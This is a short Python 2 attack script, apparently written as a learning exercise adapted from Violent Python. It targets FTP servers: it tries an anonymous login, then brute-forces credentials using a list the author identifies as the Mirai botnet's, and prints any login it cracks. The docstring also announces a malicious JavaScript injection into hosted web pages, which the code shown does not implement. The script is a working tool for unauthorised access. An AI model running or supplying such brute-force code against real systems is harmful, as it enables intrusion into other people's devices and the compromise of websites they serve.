#!/usr/bin/python

"""
Author: Yusuf Kassim

This script will attempt to break into a device that is running a FTP service. First an anonymous login will be attempted. 
Then the ftp credentials will be brute forced using a credentials list (the same list used by the mirai botnet). 
If access is gained then a malicious javascript injection will be placed within any default web page hosted by the ftp service. 

I will try to explore various inject scripts in order to learn different exploit methods.

reference: Violent Python (the code model was taken from this book)
"""


import ftplib
import sys
import optparse
from colorama import Fore


class Darkness(object):

    def __init__(self):

        self.anon = False
        self.creds = []

    def main(self):

        global hostname

        parser = optparse.OptionParser("usage: %prog" + " --host [hostname]")
        parser.add_option("--host",dest="host",type="string",help="specify target's hostname/IP")
        (options,args) = parser.parse_args()
        host = options.host

        hostname = host

        if host == None:
            parser.error("[!] Please specify target's hostname or IP address.")
        else:
            self.anonymous(host)
    
    def anonymous(self,host):
        
        print
        print "[*] Attempting Anonymous FTP login for %s" % host
        print
    
        try:
            ftp = ftplib.FTP(host,timeout=3)
            ftp.login('anonymous','yuyu@gmail.com')
            print Fore.GREEN + "[*] Success. Anonymous Login Available." + Fore.RESET
            self.anon = True
            ftp.quit()
        except:
            print Fore.BLUE + "[!] No Anonymous Login Available." + Fore.RESET
        finally:
            print
            print "[*] Initiating Brute force Now..."
            print

            self.brute_ftp()

    def brute_ftp(self):

        with open("mirai-botnet.txt","rb") as fobj:
            lines = fobj.read().splitlines()

        for line in lines:

            username = line.split()[0]
            passwd = line.split()[1]
            
            print "[*] Trying %s:%s" % (username,passwd)

            try:
                ftp = ftplib.FTP(hostname,timeout=1)
                ftp.login(username,passwd)
                print Fore.GREEN + "Credentials Cracked ===> " + username + ":" + passwd + Fore.RESET
                self.creds.append(username)
                self.creds.append(passwd)
                ftp.quit()
                return
            except:
                pass
        
        print Fore.BLUE + "[!] Brute force unsuccessful." + Fore.RESET
        
    

test = Darkness()
test.main()



